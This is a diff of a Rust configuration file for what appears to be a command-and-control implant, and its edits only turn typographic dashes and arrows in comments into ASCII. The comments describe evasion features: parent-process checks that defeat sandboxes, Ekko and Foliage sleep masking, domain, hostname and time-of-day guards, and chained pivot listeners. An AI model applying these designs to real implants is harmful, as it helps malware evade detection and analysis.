@@ -271,7 +271,7 @@ pub struct C2Config {
     #[serde(default)]
     pub alpn_protocols: Vec<String>,
     /// When true the agent operates in hibernation mode: connect, claim a
-    /// batch of queued tasks, execute, disconnect, sleep — never persists.
+    /// batch of queued tasks, execute, disconnect, sleep - never persists.
     #[serde(default)]
     pub hibernation_mode: bool,
     /// Maximum tasks claimed per hibernation check-in. Default 10.
@@ -286,16 +286,16 @@ pub struct C2Config {
     /// spawn paths for this build (e.g. ["explorer.exe", "svchost.exe"]).
     ///
     /// At startup the agent resolves its own parent via NtQueryInformationProcess
-    /// and QueryFullProcessImageNameW.  If the parent's filename is NOT in this
+    /// and QueryFullProcessImageNameW. If the parent's filename is NOT in this
     /// list, the agent runs the decoy routine and exits.
     ///
     /// Rationale: sandbox/detonation environments and analysis tools almost
-    /// always have anomalous parent chains.  Knowing the expected delivery
+    /// always have anomalous parent chains. Knowing the expected delivery
     /// path at build time (e.g. a dropper spawned from Word, or a service
     /// installed via svchost) lets you bake a lightweight, zero-noise check
     /// directly into the binary.
     ///
-    /// Leave empty (default) to disable — the check is a no-op when the
+    /// Leave empty (default) to disable - the check is a no-op when the
     /// list is empty, so existing configs need no changes.
     #[serde(default)]
     pub valid_parents: Vec<String>,
@@ -307,9 +307,9 @@ pub struct C2Config {
     // without any config migration.
 
     /// Sleep masking algorithm to use during beacon sleep windows.
-    /// "ekko"    — Ekko ROP-based timer-masked sleep (Windows only; no-op on Linux).
-    /// "foliage" — Foliage APC-based sleep mask (Windows only; no-op on Linux).
-    /// "none"    — Plain Sleep/usleep; no masking.
+    /// "ekko"    - Ekko ROP-based timer-masked sleep (Windows only; no-op on Linux).
+    /// "foliage" - Foliage APC-based sleep mask (Windows only; no-op on Linux).
+    /// "none"    - Plain Sleep/usleep; no masking.
     #[serde(default = "default_sleep_mask")]
     pub sleep_mask: String,
 
@@ -345,23 +345,23 @@ pub struct C2Config {
 
     /// Glob pattern the AD domain name must match at runtime (case-insensitive).
     /// e.g. "CORP*" or "*.example.com".
-    /// Empty string (default) disables the check — agent runs on any domain.
+    /// Empty string (default) disables the check - agent runs on any domain.
     #[serde(default)]
     pub guard_domain: String,
 
     /// Glob pattern the machine hostname must match at runtime (case-insensitive).
     /// e.g. "DESKTOP-*" or "WKS??".
-    /// Empty string (default) disables the check — agent runs on any hostname.
+    /// Empty string (default) disables the check - agent runs on any hostname.
     #[serde(default)]
     pub guard_hostname: String,
 
-    /// Hour of day (0–23, local time) before which the agent must not run.
+    /// Hour of day (0-23, local time) before which the agent must not run.
     /// Together with `guard_hour_end` this forms an active-hours window.
     /// Both 0 (default) disables the time-window check entirely.
     #[serde(default)]
     pub guard_hour_start: u8,
 
-    /// Hour of day (0–23, local time) after which the agent must not run.
+    /// Hour of day (0-23, local time) after which the agent must not run.
     /// Together with `guard_hour_start` this forms an active-hours window.
     /// Both 0 (default) disables the time-window check entirely.
     #[serde(default)]
@@ -383,18 +383,18 @@ pub struct C2Config {
     /// hop after it connects.
     ///
     /// Example 4-hop chain:
-    ///   hop1 agent: auto_pivot_port = None  (direct session; operator starts
+    ///   hop1 agent: auto_pivot_port = None (direct session; operator starts
     ///               its listener manually with: pivot:listener_tcp 5001)
-    ///   hop2 agent: auto_pivot_port = Some(5002)  ← starts :5002 on connect
-    ///   hop3 agent: auto_pivot_port = Some(5003)  ← starts :5003 on connect
-    ///   hop4 agent: auto_pivot_port = None         ← leaf node, no downstream
+    ///   hop2 agent: auto_pivot_port = Some(5002) ← starts :5002 on connect
+    ///   hop3 agent: auto_pivot_port = Some(5003) ← starts :5003 on connect
+    ///   hop4 agent: auto_pivot_port = None ← leaf node, no downstream
     ///
     /// The listener starts in a detached background task immediately after the
     /// handshake completes, so it is ready before downstream agents reach their
     /// first reconnect attempt (assuming a reasonable initial_delay / retry
     /// window in the downstream fallback profile).
     ///
-    /// Leave as None (default) to disable — the check is a no-op and existing
+    /// Leave as None (default) to disable - the check is a no-op and existing
     /// configs need no changes.
     #[serde(default)]
     pub auto_pivot_port: Option<u16>,
@@ -408,7 +408,7 @@ pub struct ClientHello {
     pub computer_id: String,
     pub exe_id: String,
     pub build_id: String,
-    /// HMAC-SHA256(challenge_key, build_id || exe_id || reg_timestamp) — proves
+    /// HMAC-SHA256(challenge_key, build_id || exe_id || reg_timestamp) - proves
     /// agent has the build secret. Includes a timestamp to prevent replay attacks.
     /// Empty string for legacy builds without challenge_key.
     #[serde(default)]
@@ -419,7 +419,7 @@ pub struct ClientHello {
     /// Network interfaces reported for topology inference.
     #[serde(default)]
     pub interfaces: Vec<NetworkInterface>,
-    /// Agent is operating in hibernation mode (connect → tasks → disconnect → sleep).
+    /// Agent is operating in hibernation mode (connect -> tasks -> disconnect -> sleep).
     #[serde(default)]
     pub hibernation_mode: bool,
     /// Maximum tasks to claim per hibernation check-in.
